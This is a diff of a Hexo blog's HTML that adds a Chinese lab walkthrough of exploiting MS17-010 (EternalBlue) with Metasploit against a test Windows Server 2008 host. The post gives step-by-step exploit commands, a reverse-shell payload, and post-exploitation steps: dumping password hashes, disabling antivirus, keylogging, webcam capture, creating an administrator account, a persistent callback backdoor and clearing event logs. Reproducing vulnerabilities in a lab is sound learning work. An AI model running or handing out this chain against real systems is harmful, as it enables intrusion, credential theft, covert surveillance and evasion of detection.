@@ -562,6 +562,285 @@
 
     
     <article
+  id="post-WannaCry"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/11/27/WannaCry/"
+    >永恒之蓝 - 勒索病毒</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/11/27/WannaCry/" class="article-date">
+  <time datetime="2020-11-27T03:49:25.000Z" itemprop="datePublished">2020-11-27</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/WannaCry/">WannaCry</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p><strong>目录</strong></p>
+<p><a href>Metasploit</a></p>
+<p><a href>使用方法</a></p>
+<p><a href>ms17-010漏洞复现</a></p>
+<p><a href>1. 主机发现</a></p>
+<p><a href>2. 进入MSF框架</a></p>
+<p><a href>3. 使用ms17-010扫描模块，对靶机进行扫描</a></p>
+<p><a href>4. 使用ms17-010攻击模块，对靶机进行攻击</a></p>
+<p><a href>后渗透阶段</a></p>
+<p><a href>Post后渗透模块</a></p>
+<p><a href>查看目标主机是否运行在虚拟机上</a></p>
+<p><a href>关闭杀毒软件</a></p>
+<p><a href>访问文件系统</a></p>
+<p><a href>下载/上传文件</a></p>
+<p><a href>权限提升</a></p>
+<p><a href>获取用户密码</a></p>
+<p><a href>运行程序</a></p>
+<p><a href>屏幕截图</a></p>
+<p><a href>创建新账号</a></p>
+<p><a href>启用远程桌面</a></p>
+<p><a href>键盘记录</a></p>
+<p><a href>进程迁移</a></p>
+<p><a href>禁止目标主机使用键盘鼠标</a></p>
+<p><a href>用目标主机摄像头拍照</a></p>
+<p><a href>使用扩展库</a></p>
+<p><a href>生成持续性后门</a></p>
+<p><a href>清除事件日志</a></p>
+<hr>
+<h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。</p>
+<p><em>MSF的更新</em>：apt update</p>
+<p>​                         apt install metasploit-framework</p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a><em>使用方法</em></h2><ul>
+<li>​    进入框架：msfconsole</li>
+<li>​    使用search命令查找相关漏洞： search  ms17-010</li>
+<li>​    使用use进入模块:  use exploit/windows/smb/ms17_010_eternalblue   </li>
+<li>​    使用info查看模块信息： info </li>
+<li>​    设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp</li>
+<li>​    查看模块需要配置的参数：show options</li>
+<li>​    设置参数：set  RHOST  192.168.125.138</li>
+<li>​    攻击：exploit /  run </li>
+<li>​    后渗透阶段</li>
+</ul>
+<p>不同的攻击用到的步骤也不一样，接下来我们用永恒之蓝ms17-010来熟悉一下MSF工具的使用</p>
+<hr>
+<h1 id="ms17-010漏洞复现"><a href="#ms17-010漏洞复现" class="headerlink" title="ms17-010漏洞复现"></a>ms17-010漏洞复现</h1><p><em>描述</em></p>
+<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<p><em>影响版本</em></p>
+<p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0</p>
+<p><em>复现环境</em></p>
+<p>攻击机： kali</p>
+<p>靶机：win server 2008 r2  (192.168.1.8)</p>
+<hr>
+<p><strong>复现过程</strong></p>
+<h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1. 主机发现"></a>1. 主机发现</h2><p>nmap进行ip端口扫描</p>
+<p><img src="/2020/11/27/WannaCry/1605156853686.png" alt="img"></p>
+<p>扫描到开放了445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞</p>
+<h2 id="2-进入MSF框架"><a href="#2-进入MSF框架" class="headerlink" title="2. 进入MSF框架"></a>2. 进入MSF框架</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/27/WannaCry/1605156861825.png" alt="img"></p>
+<p>这里可以得到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞</p>
+<p>exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，一般配合使用，前者先扫描，若显示有漏洞，再进行攻击。</p>
+<h2 id="3-使用ms17-010扫描模块，对靶机进行扫描"><a href="#3-使用ms17-010扫描模块，对靶机进行扫描" class="headerlink" title="3. 使用ms17-010扫描模块，对靶机进行扫描"></a>3. 使用ms17-010扫描模块，对靶机进行扫描</h2><p><em>使用模块</em></p>
+<p>​     该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p>
+<p>​      <code>msf&gt; use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p><em>查看模块需要配置的参数</em></p>
+<p>​     <code>show option</code> </p>
+<p><img src="/2020/11/27/WannaCry/1605156137683.png" alt="img"></p>
+<p>​              右边Required为yes的选项说明左边 Current Setting 这个项对应的需要填写，比如Rhoststs</p>
+<p><em>设置攻击目标</em></p>
+<p>​     RHOSTS 参数是要探测主机的ip或ip范围（比如 192.168.125.125-129.168.125.140 或者 192.168.1.0/24）</p>
+<p>​    <code> set rhosts  192.168.1.8</code></p>
+<p><em>再次查看配置参数</em></p>
+<p>​    <code>show options </code></p>
+<p><em>执行扫描</em></p>
+<p>​    <code> run</code>    </p>
+<p>​              <img src="/2020/11/27/WannaCry/1605156143487.png" alt="img"></p>
+<p>​              显示主机很可能能够会受到永恒之蓝漏洞的攻击</p>
+<h2 id="4-使用ms17-010攻击模块，对靶机进行攻击"><a href="#4-使用ms17-010攻击模块，对靶机进行攻击" class="headerlink" title="4. 使用ms17-010攻击模块，对靶机进行攻击"></a>4. 使用ms17-010攻击模块，对靶机进行攻击</h2><p>   <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p><em>查看这个漏洞的信息</em></p>
+<p>​    <code>info</code></p>
+<p><em>查看可攻击的系统平台，这个命令显示该攻击模块针对哪些特定操作系统版本、语言版本的系统</em></p>
+<p>​    <code>show targets</code></p>
+<p>​    <img src="/2020/11/27/WannaCry/1605156152253.png" alt="img"></p>
+<p>​     这里只有一个，有些其他的漏洞模块对操作系统的语言和版本要求的很严，比如MS08_067，这样就要我们指定目标系统的版本的。如果不设置的话，MSF会自动帮我们判断目标操作系统的版本和语言(利用目标系统的指纹特征)</p>
+<p><em>查看攻击载荷</em></p>
+<p>​    攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令</p>
+<p>   <code> show payloads</code></p>
+<p>​    该命令可以查看当前漏洞利用模块下可用的所有Payload</p>
+<p><img src="/2020/11/27/WannaCry/1605156871417.png" alt="img"></p>
+<p><em>设置攻击载荷</em></p>
+<p>​     <code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
+<p><em>查看配置参数</em></p>
+<p>​      <code>show options </code></p>
+<p><em>设置目标攻击ip</em></p>
+<p>​     <code> set rhosts 192.168.1.8</code>  (如果有多个攻击目标ip间直接用空格隔开就行)</p>
+<p><em>设置用于接收从目标机弹回来的shell</em></p>
+<p>​    <code>set  LHOST 192.168.1.11</code></p>
+<p><em>执行攻击</em></p>
+<p>​    <code>exploit（run） </code><img src="/2020/11/27/WannaCry/1605156878162.png" alt="img"></p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a><strong>后渗透阶段</strong></h2><p>运行了exploit命令之后，我们开启了一个reverse TCP监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 meterpreter &gt; 出现，我们输入： shell  即可切换到目标主机的windows shell，要想从目标主机shell退出到 meterpreter ，我们只需输入：exit</p>
+<p><img src="/2020/11/27/WannaCry/1605156884361.png" alt="img"></p>
+<p>要想从 meterpreter 退出到MSF框架，输入：background     </p>
+<p><img src="/2020/11/27/WannaCry/1605156186145.png" alt="img">      </p>
+<p>输入  <code>sessions -l</code>   查看我们获得的shell</p>
+<p>输入  <code>sessions -i 1</code>  即可切换到id为1的shell</p>
+<p>​            <img src="/2020/11/27/WannaCry/1605156197116.png" alt="img"></p>
+<ul>
+<li> Post后渗透模块</li>
+</ul>
+<p>在meterpreter &gt; 中我们可以使用以下的命令来实现对目标的操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​```</span><br><span class="line">sysinfo             <span class="comment">#查看目标主机系统信息</span></span><br><span class="line">run scraper         <span class="comment">#查看目标主机详细信息</span></span><br><span class="line">run hashdump        <span class="comment">#导出密码的哈希</span></span><br><span class="line">load kiwi           <span class="comment">#加载</span></span><br><span class="line">ps                  <span class="comment">#查看目标主机进程信息</span></span><br><span class="line"><span class="built_in">pwd</span>                 <span class="comment">#查看目标当前目录(windows)</span></span><br><span class="line">getlwd              <span class="comment">#查看目标当前目录(Linux)</span></span><br><span class="line">search -f *.jsp -d e:\                <span class="comment">#搜索E盘中所有以.jsp为后缀的文件</span></span><br><span class="line">download  e:\test.txt  /root          <span class="comment">#将目标机的e:\test.txt文件下载到/root目录下</span></span><br><span class="line">upload    /root/test.txt d:\<span class="built_in">test</span>      <span class="comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span></span><br><span class="line">PIDmigrate 1384     <span class="comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span></span><br><span class="line">idletime            <span class="comment">#查看主机运行时间</span></span><br><span class="line">getuid              <span class="comment">#查看获取的当前权限</span></span><br><span class="line">getsystem           <span class="comment">#提权</span></span><br><span class="line">run  killav         <span class="comment">#关闭杀毒软件</span></span><br><span class="line">screenshot          <span class="comment">#截图</span></span><br><span class="line">webcam_list         <span class="comment">#查看目标主机的摄像头</span></span><br><span class="line">webcam_snap         <span class="comment">#拍照</span></span><br><span class="line">webcam_stream       <span class="comment">#开视频</span></span><br><span class="line">execute  参数  -f 可执行文件   <span class="comment">#执行可执行程序</span></span><br><span class="line">run getgui -u hack -p 123    <span class="comment">#创建hack用户，密码为123</span></span><br><span class="line">run getgui -e                <span class="comment">#开启远程桌面</span></span><br><span class="line">keyscan_start                <span class="comment">#开启键盘记录功能</span></span><br><span class="line">keyscan_dump                 <span class="comment">#显示捕捉到的键盘记录信息</span></span><br><span class="line">keyscan_stop                 <span class="comment">#停止键盘记录功能</span></span><br><span class="line">uictl  <span class="built_in">disable</span>  keyboard     <span class="comment">#禁止目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">enable</span>   keyboard     <span class="comment">#允许目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">disable</span>  mouse        <span class="comment">#禁止目标使用鼠标</span></span><br><span class="line">uictl  <span class="built_in">enable</span>   mouse        <span class="comment">#允许目标使用鼠标</span></span><br><span class="line">load                         <span class="comment">#使用扩展库</span></span><br><span class="line">run				             <span class="comment">#使用扩展库</span></span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        <span class="comment">#反弹时间间隔是5s 会自动连接</span></span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     <span class="comment">#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span></span><br><span class="line">clearev                       <span class="comment">#清除日志</span></span><br></pre></td></tr></table></figure>
+
+<p> 下面的模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate                  <span class="comment">#自动进程迁移     </span></span><br><span class="line">run post/windows/gather/checkvm                  <span class="comment">#查看目标主机是否运行在虚拟机上     </span></span><br><span class="line">run post/windows/manage/killav                   <span class="comment">#关闭杀毒软件     </span></span><br><span class="line">run post/windows/manage/enable_rdp               <span class="comment">#开启远程桌面服务     </span></span><br><span class="line">run post/windows/manage/autoroute                <span class="comment">#查看路由信息     </span></span><br><span class="line">run post/windows/gather/enum_logged_on_users     <span class="comment">#列举当前登录的用户     </span></span><br><span class="line">run post/windows/gather/enum_applications        <span class="comment">#列举应用程序     </span></span><br><span class="line">run windows/gather/credentials/windows_autologin <span class="comment">#抓取自动登录的用户名和密码     </span></span><br><span class="line">run windows/gather/smart_hashdump                <span class="comment">#dump出所有用户的hash</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看目标主机是否运行在虚拟机上"><a href="#查看目标主机是否运行在虚拟机上" class="headerlink" title="查看目标主机是否运行在虚拟机上"></a><em>查看目标主机是否运行在虚拟机上</em></h3><p><img src="/2020/11/27/WannaCry/1605156207711.png" alt="img"></p>
+<h3 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h3><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：</p>
+<p>​    <code>run killav</code></p>
+<p><img src="/2020/11/27/WannaCry/1605156214541.png" alt="img"></p>
+<h3 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h3><p>Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似，这里就不演示了）</p>
+<p><img src="/2020/11/27/WannaCry/1605156894153.png" alt="img"></p>
+<h3 id="下载-上传文件"><a href="#下载-上传文件" class="headerlink" title="下载/上传文件"></a>下载/上传文件</h3><p><code>download file</code>   从目标主机下载文件</p>
+<p><code>upload file </code>       上传文件到目标主机</p>
+<p><img src="/2020/11/27/WannaCry/1605156231462.png" alt="img"></p>
+<p>​     这里下载的文件的路径默认在家目录下</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权</p>
+<p><code>getuid</code>  获取当前用户的信息</p>
+<p><img src="/2020/11/27/WannaCry/1605156237546.png" alt="img"></p>
+<p>可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限</p>
+<h3 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h3><p>执行 ：<code>run hashdump</code></p>
+<p>hashdump 模块可以从SAM数据库中导出本地用户账号, 该命令的使用需要系统权限</p>
+<p><img src="/2020/11/27/WannaCry/1605156253323.png" alt="img"></p>
+<p>从上图可知，导出了三个用户名及密码，输出格式为，用户名：SID：LM哈希：NTLM哈希::: </p>
+<p>我们来破解用户名为chenchen的用户密码，可以复制 NTLM哈希去在线网站如 <a href=".?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduend~default-1-104044002.nonecase&utm_term=%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%80%8E%E4%B9%88%E9%80%80%E5%87%BAshell&spm=1000.2123.3001.4430">www.cmd5.com </a>破解</p>
+<p><img src="/2020/11/27/WannaCry/1605156261338.png" alt="img"></p>
+<h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>查看目标主机安装了哪些应用</p>
+<p><code>run post/windows/gather/enum_applications</code></p>
+<p><img src="/2020/11/27/WannaCry/1605156270775.png" alt="img"></p>
+<p>可以使用 execute 命令在目标系统中执行程序。使用方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute  参数  -f  可执行文件</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可选参数：</p>
+<p>-f：指定可执行文件</p>
+<p>-H：创建一个隐藏进程</p>
+<p>-a：传递给命令的参数</p>
+<p>-i：  跟进程进行交互</p>
+<p>-m：从内存中执行</p>
+<p>-t： 使用当前伪造的线程令牌运行进程</p>
+<p>-s： 在给定会话中执行进程</p>
+</blockquote>
+<p><img src="/2020/11/27/WannaCry/1605156281145.png" alt="img"></p>
+<p>如果我想执行它某个应用程序的话，该怎么实现？？</p>
+<h3 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h3><p>输入 ： <code>screenshot </code> 即可对目标主机的当前使用屏幕进去屏幕截取</p>
+<p><img src="/2020/11/27/WannaCry/1605156293200.png" alt="img"></p>
+<h3 id="创建新账号"><a href="#创建新账号" class="headerlink" title="创建新账号"></a>创建新账号</h3><p>查看目标主机有哪些账户</p>
+<p><code>run post/windows/gather/enum_logged_on_users</code></p>
+<p><img src="/2020/11/27/WannaCry/1605156301211.png" alt="img"></p>
+<p>接着，我们在目标机中创建一个新的账号  ： <code>run getgui -u hack -p 123</code>  ，这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。</p>
+<p>这里成功创建了用户，但是添加到Administrators组中失败了 ？？why</p>
+<p><img src="/2020/11/27/WannaCry/1605156307135.png" alt="img"></p>
+<p>如果添加到Administrators组中失败了的话，我们可以运行：shell ，进行cmd窗口手动将该用户添加到administrators组中。</p>
+<h3 id="启用程桌面"><a href="#启用程桌面" class="headerlink" title="启用程桌面"></a>启用程桌面</h3><p>当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p>
+<p>我们可以通过运行getuid脚本帮我们开启目标主机的远程桌面，可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启），我们输入： run getgui -e  或者  run post/windows/manage/enable_rdp</p>
+<p>在目标机上右键属性远程桌面确实被打开了</p>
+<p>在开启远程桌面会话之前，我们还需要使用“idletime”命令检查远程用户的空闲时长： idletime  ，这一步不太懂？？</p>
+<p><img src="/2020/11/27/WannaCry/1605156313657.png" alt="img"></p>
+<p>然后怎么通过远程桌面用我们创建的用户登录目标主机？后面再来解答</p>
+<h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p>
+<blockquote>
+<blockquote>
+<p>keyscan_start：开启键盘记录功能</p>
+<p>keyscan_dump：显示捕捉到的键盘记录信息</p>
+<p>keyscan_stop：停止键盘记录功能</p>
+</blockquote>
+</blockquote>
+<p>在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录 </p>
+<h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。</p>
+<p>在下面的例子中，我们会将Meterpreter跟 winlogon.exe 绑定，并在登录进程中捕获键盘记录，以获得用户的密码。</p>
+<p>首先，我们需要使用： ps  命令查看目标设备中运行的进程：</p>
+<p><img src="/2020/11/27/WannaCry/1605156320615.png" alt="img"></p>
+<p>我们可以使用：  getpid  查看我们当前的进程id</p>
+<p>使用： migrate  目标进程ID 命令来绑定目标进程id，这里绑定目标pid的时候，经常会断了 shell。进程迁移后会自动关闭原来进程，没有关闭可使用  kill  pid  命令关闭进程。或者使用自动迁移进程（run post/windows/manage/migrate）命令，系统会自动寻找合适的进程然后迁移</p>
+<p><img src="/2020/11/27/WannaCry/1605156325319.png" alt="img"></p>
+<p>进程迁移绑定完成后，就可以开始捕获键盘数据了</p>
+<p>运行键盘记录功能的命令</p>
+<p><img src="/2020/11/27/WannaCry/1605156329137.png" alt="img"></p>
+<p>我在目标机上进行了按键操作为何不记录？？</p>
+<h3 id="禁止目标主机使用键盘鼠标"><a href="#禁止目标主机使用键盘鼠标" class="headerlink" title="禁止目标主机使用键盘鼠标"></a>禁止目标主机使用键盘鼠标</h3><ul>
+<li>禁止(允许)目标使用键盘：<code> uictl  disable (enable) keyboard</code></li>
+<li>禁止(允许)目标使用鼠标： <code>uictl  disable (enable) mouse</code></li>
+</ul>
+<p><img src="/2020/11/27/WannaCry/1605156333863.png" alt="img"></p>
+<p>what？？</p>
+<h3 id="用目标主机摄像头拍照"><a href="#用目标主机摄像头拍照" class="headerlink" title="用目标主机摄像头拍照"></a>用目标主机摄像头拍照</h3><ul>
+<li>获取目标系统的摄像头列表：<code>webcam_list</code></li>
+<li>•从指定的摄像头，拍摄照片：<code>webcam_snap</code></li>
+<li>•从指定的摄像头，开启视频：<code>webcam_stream</code></li>
+</ul>
+<h2 id><a href="#" class="headerlink" title></a><img src="/2020/11/27/WannaCry/1605156340725.png" alt="img"></h2><p>我这里没有摄像头就不演示了</p>
+<h3 id="使用扩展库"><a href="#使用扩展库" class="headerlink" title="使用扩展库"></a>使用扩展库</h3><p>使用 <code>load -l </code> 查看扩展库</p>
+<p><img src="/2020/11/27/WannaCry/1605156346302.png" alt="img"></p>
+<h3 id="生成持续性后门"><a href="#生成持续性后门" class="headerlink" title="生成持续性后门"></a>生成持续性后门</h3><p>因为 meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接，这样太麻烦了。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。</p>
+<p>建立持续性后门有两种方法</p>
+<ul>
+<li>通过启动项启动</li>
+<li>通过服务启动</li>
+</ul>
+<p>启动项启动</p>
+<p>用这种方法的话，我们先生成一个后门工具   ，传送门 –&gt;  <a target="_blank" rel="noopener" href="https://mp.csdn.net/postedit/104089663">用msf生成一个后门木马</a></p>
+<p>然后放到windows的启动目录中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<p>服务启动</p>
+<p>通过服务启动，我们可以运行命令 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.43.226</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/27/WannaCry/1605156352420.png" alt="img"></p>
+<p>注释反弹时间间隔是5s， 会自动连接192.168.43.226的4444端口，缺点是容易被杀毒软件查杀</p>
+<p>然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</p>
+<p>在目标主机可以看到这样一个文件夹，是一个VBScript脚本</p>
+<p><img src="/2020/11/27/WannaCry/1605156358041.png" alt="img"></p>
+<p>查看靶机的端口连接情况  netstat -an  可以看到靶机连着我们的8888端口</p>
+<p><img src="/2020/11/27/WannaCry/1605156365042.png" alt="img"></p>
+<p>靶机进行重启后，查看端口状态确实是连着的，但是msf断了又得重新exploit，如何通过留的后门进入靶机而不是通过msf进行进入到靶机里面？</p>
+<h3 id="清除事件日志"><a href="#清除事件日志" class="headerlink" title="清除事件日志"></a>清除事件日志</h3><p>完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令  clearev  命令来清除事件日志：</p>
+<p><img src="/2020/11/27/WannaCry/1605156371141.png" alt="img"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WannaCry/" rel="tag">WannaCry</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
   id="post-fabric"
   class="article article-type-post"
   itemscope
@@ -1252,80 +1531,6 @@
     <footer class="article-footer">
        
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Git/" rel="tag">Git</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-sublime配置"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/11/13/sublime%E9%85%8D%E7%BD%AE/"
-    >Sublime 乱码问题及插件安装</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2020/11/13/sublime%E9%85%8D%E7%BD%AE/" class="article-date">
-  <time datetime="2020-11-13T02:21:29.000Z" itemprop="datePublished">2020-11-13</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sublime/">Sublime</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h2 id="sublime-解决中文乱码问题"><a href="#sublime-解决中文乱码问题" class="headerlink" title="sublime 解决中文乱码问题"></a>sublime 解决中文乱码问题</h2><h3 id="1-通过快捷键-ctrl-进入命令行，并输入以下命令然后回车"><a href="#1-通过快捷键-ctrl-进入命令行，并输入以下命令然后回车" class="headerlink" title="1.通过快捷键 ctrl + ~ 进入命令行，并输入以下命令然后回车"></a>1.通过快捷键 ctrl + ~ 进入命令行，并输入以下命令然后回车</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request,os,hashlib; h = <span class="string">&#x27;7183a2d3e96f11eeadd761d777e62404e330c659d4bb41d3bdf022e94cab3cd0&#x27;</span>; pf = <span class="string">&#x27;Package Control.sublime-package&#x27;</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( <span class="string">&#x27;http://sublime.wbond.net/&#x27;</span> + pf.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;%20&#x27;</span>)).<span class="built_in">read</span>(); dh = hashlib.sha256(by).hexdigest(); <span class="built_in">print</span>(<span class="string">&#x27;Error validating download (got %s instead of %s), please try manual install&#x27;</span> % (dh, h)) <span class="keyword">if</span> dh != h <span class="keyword">else</span> open(os.path.join( ipp, pf), <span class="string">&#x27;wb&#x27;</span> ).write(by)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>这是由于网络访问网站<a target="_blank" rel="noopener" href="http://packagecontrol.io/%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E6%88%90%E5%8A%9F%E5%AF%BC%E8%87%B4%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E7%A1%AE%E4%BF%9D%E8%83%BD%E5%A4%9F%E8%AE%BF%E9%97%AE%E8%AF%A5%E7%BD%91%E5%9D%80%E6%97%B6%E6%89%8D%E8%83%BD%E7%BB%A7%E7%BB%AD%E5%AE%89%E8%A3%85%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%9A%84%E6%96%B9%E5%BC%8F%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8F%88%E5%87%BA%E7%8E%B0%E4%BA%86%E4%B8%8B%E9%9D%A2%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A">http://packagecontrol.io/无法访问成功导致的，所以确保能够访问该网址时才能继续安装，这里我直接通过科学上网的方式就可以访问了，但是又出现了下面的问题：</a></p>
-</li>
-<li><p>根据报错信息将该命令中的str1 字符串换成str2再重试即可发现成功</p>
-</li>
-</ul>
